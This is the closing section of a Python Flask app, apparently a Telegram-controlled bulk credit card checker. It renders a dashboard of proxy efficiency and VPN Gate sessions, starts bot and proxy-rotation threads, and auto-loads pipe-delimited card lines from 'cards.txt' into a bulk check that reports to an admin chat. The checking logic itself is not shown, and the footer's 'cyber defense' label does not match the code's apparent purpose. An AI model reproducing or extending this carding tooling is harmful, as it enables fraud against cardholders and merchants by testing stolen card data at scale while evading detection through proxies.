                        <p style="font-size: 0.8rem; margin-bottom: 10px;">Efficiency: <span style="color:var(--cyber-blue)">{int((STATS['proxy_success']/(STATS['proxy_success']+STATS['proxy_errors'])*100)) if (STATS['proxy_success']+STATS['proxy_errors']) > 0 else 100}%</span></p>
                        <p style="font-size: 0.7rem; color: #444; margin-top: 15px;">REFRESH_CYCLE: {STATS['last_proxy_refresh']}</p>
                    </div>

                    <div class="panel-header" style="margin-top: 1.5rem;">VPN_GATE_MONITOR</div>
                    <div class="stat-card" style="border-radius: 0 0 4px 4px; border-top: none; padding: 10px; max-height: 250px; overflow-y: auto;">
                        <table style="width: 100%; border-collapse: collapse; font-size: 0.65rem;">
                            <tr style="color: #555; text-align: left; border-bottom: 1px solid #222;">
                                <th style="padding: 5px;">COUNTRY</th>
                                <th style="padding: 5px;">PROTOCOL</th>
                                <th style="padding: 5px;">MBPS</th>
                            </tr>
                            {''.join([f'<tr style="border-bottom: 1px solid #1a1a1a;"><td style="padding: 5px; color: var(--cyber-blue)">{s["country"]}</td><td style="padding: 5px;">{s["protocol"]}</td><td style="padding: 5px; color: var(--cyber-green)">{s["mbps"]}</td></tr>' for s in STATS["vpn_sessions"]]) if STATS["vpn_sessions"] else '<tr><td colspan="3" style="text-align:center; padding: 10px; color:#444;">SYNCING VPN GATE...</td></tr>'}
                        </table>
                    </div>

                    <div class="panel-header" style="margin-top: 1.5rem;">ACTIVE_SESSIONS</div>
                    <div class="stat-card" style="border-radius: 0 0 4px 4px; border-top: none;">
                        <p style="font-size: 0.8rem;">Current Users: <span style="color:#fff">{len(USER_PROCESSES)}</span></p>
                        <p style="font-size: 0.7rem; color:#444; margin-top:5px;">Multi-threading enabled</p>
                    </div>
                </div>
            </div>

            <div class="footer-strip">
                &copy; 2026 SBSHEHAB // ADVANCED AUTOMATION & CYBER DEFENSE SYSTEMS
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_template)

# বট এবং প্রক্সি রিফ্রেশার থ্রেড শুরু করা (Gunicorn এ সাপোর্ট পাওয়ার জন্য বাইরে রাখা হয়েছে)
# Bot and Proxy refresher threads start
def start_background_threads():
    # Use a lock file to ensure only one process starts the bot
    # This is crucial for Gunicorn which might import the script multiple times
    # Use a lock file to ensure only one process starts the bot
    # This is crucial for Gunicorn which might import the script multiple times
    import tempfile
    lock_path = os.path.join(tempfile.gettempdir(), "sbs_bot_v2.lock")
    
    # Try to acquire the lock
    try:
        f = open(lock_path, 'a')
        try:
            import fcntl
            # Try to get an exclusive lock, do not block (LOCK_NB)
            fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except (ImportError, IOError, OSError):
            # If we are on Windows or the lock is already held by another process
            if any(t.name == "BotThread" for t in threading.enumerate()):
                return
            
            # On Linux, if flock failed, it means another Gunicorn worker has the lock
            if os.name != 'nt': 
                logging.info(f"Process {os.getpid()} - Lock busy, background tasks already active.")
                return
        
        logging.info(f"Process {os.getpid()} - Lock acquired. Starting background services.")
    except Exception as e:
        logging.warning(f"Locking mechanism bypassed: {e}")

    # Remove delay from here to prevent blocking Gunicorn startup
    t1 = threading.Thread(target=run_bot, daemon=True, name="BotThread")
    t1.start()
    t2 = threading.Thread(target=proxy_refresher, daemon=True, name="ProxyThread")
    t2.start()

# Start background threads
start_background_threads()

if __name__ == "__main__":
    # পোর্ট কনফিগারেশন
    port = int(os.environ.get("PORT", 5000))
    
    # ইনপুট ফাইল থেকে কার্ড থাকলে অটো চেকিং শুরু করা (ঐচ্ছিক)
    if os.path.exists("cards.txt"):
        with open("cards.txt", "r") as f:
            initial_cards = [l.strip() for l in f.readlines() if "|" in l]
            if initial_cards:
                logging.info("Starting initial bulk check from cards.txt...")
                threading.Thread(target=start_bulk_check, args=(initial_cards, ADMIN_CHAT_ID), daemon=True).start()
    
    # Flask সার্ভার রান করা হচ্ছে
    app.run(host='0.0.0.0', port=port)


